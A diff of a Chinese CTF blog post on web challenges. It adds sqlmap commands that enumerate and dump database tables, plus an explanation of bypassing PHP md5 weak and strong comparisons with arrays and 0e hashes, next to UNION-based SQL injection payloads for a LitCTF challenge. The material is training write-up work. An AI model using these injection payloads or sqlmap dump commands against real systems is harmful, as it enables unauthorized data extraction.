@@ -15,8 +15,9 @@
 <meta property="og:site_name" content="花开再美，怎如初见..?">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg">
+<meta property="og:image" content="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6gwbpclsays0.webp">
 <meta property="article:published_time" content="2023-09-21T05:45:27.000Z">
-<meta property="article:modified_time" content="2023-09-22T06:38:00.328Z">
+<meta property="article:modified_time" content="2023-10-16T13:58:11.098Z">
 <meta property="article:author" content="wuming">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="Web">
@@ -103,7 +104,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/litctf/" style="font-size: 10px;">litctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/write-up/" style="font-size: 10px;">write up</a>
+						<a href="/tags/Pwn/" style="font-size: 10px;">Pwn</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/litctf/" style="font-size: 10px;">litctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/re/" style="font-size: 10px;">re</a> <a href="/tags/write-up/" style="font-size: 10px;">write up</a>
 					</div>
 				</section>
 				
@@ -219,7 +220,7 @@
     2. 列必须拥有相似的数据类型（相似的意思是：有些数据类型间可以互相转化，比如数字字符串和数字。这就叫相似，相似就行，不是必须一模一样）
     3. 每个 SELECT 语句中的列的顺序必须相同
 </code></pre>
-<p>记录一种做题方法</p>
+<h2 id="手注："><a href="#手注：" class="headerlink" title="手注："></a>手注：</h2><p>记录一种做题方法</p>
 <p>题目来源 Litctf sql注入</p>
 <p>1.先判断显示位，payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span>)))))) union select <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
@@ -265,7 +266,45 @@
 <p>14.重新获取值：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(flag) <span class="keyword">from</span> ctftraining.flag<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2>
+<h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p>查询是否可以找到数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>查数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p>查表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -D school -tables --batch</span><br></pre></td></tr></table></figure>
+
+<p>查字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D school -T students --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p>查数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D school -T students -C name --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p>当请求延时的时候使用–delay 1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch --delay 1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2><h2 id="md5弱比较，强比较"><a href="#md5弱比较，强比较" class="headerlink" title="md5弱比较，强比较"></a>md5弱比较，强比较</h2><p>知识点：[【PHP】MD5比较漏洞 弱比较、强比较、强碰撞_md5字符串qnkcdzo与s_小 白 萝 卜的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/EC_Carrot/article/details/109525162#:~:text=%E5%BC%B1%E6%AF%94%E8%BE%83">https://blog.csdn.net/EC_Carrot/article/details/109525162#:~:text=弱比较</a> if(%24_POST[‘a’]!%3D%24_POST[‘b’]%26%26,md5(%24_POST[‘a’])%3D%3Dmd5(%24_POST[‘b’])){ die(“success!”)%3B })</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/109856150">CTF中的md5弱类型（ALL_IN_ONE）_ctf all in one_OceanSec的博客-CSDN博客</a></p>
+<p>例题：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2076">NSSCTF 2022 Spring Recruit]babyphp | NSSCTF</a></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到他一共是有三层比较，我们需要一层一层的绕过</p>
+<p>第一层的意思是</p>
+<ul>
+<li>“a” 字段存在。</li>
+<li>“a” 字段的值不包含数字字符。</li>
+<li>“a” 字段的值可以转换为一个非零的整数。</li>
+</ul>
+<p>我们就可以使用数组的形式，来绕过他的判断，数组的hash他是不会输出hash值的，所以不管什么值都是真确</p>
+<p>第二层就是输入b1和b2，进行md5强比较</p>
+<p>也可以直接使用数组的方式绕过</p>
+<p>第三层是md5弱比较，我们直接采用那些字符转换md5会变成0e开头的就可以了</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6gwbpclsays0.webp" alt="image-20230923170343632"></p>
+
       
     </div>
     
@@ -273,6 +312,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2023/09/23/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          re做题记录
+        
+      </div>
+    </a>
   
   
     <a href="/2023/09/19/litctf/" id="article-nav-older" class="article-nav-link-wrap">
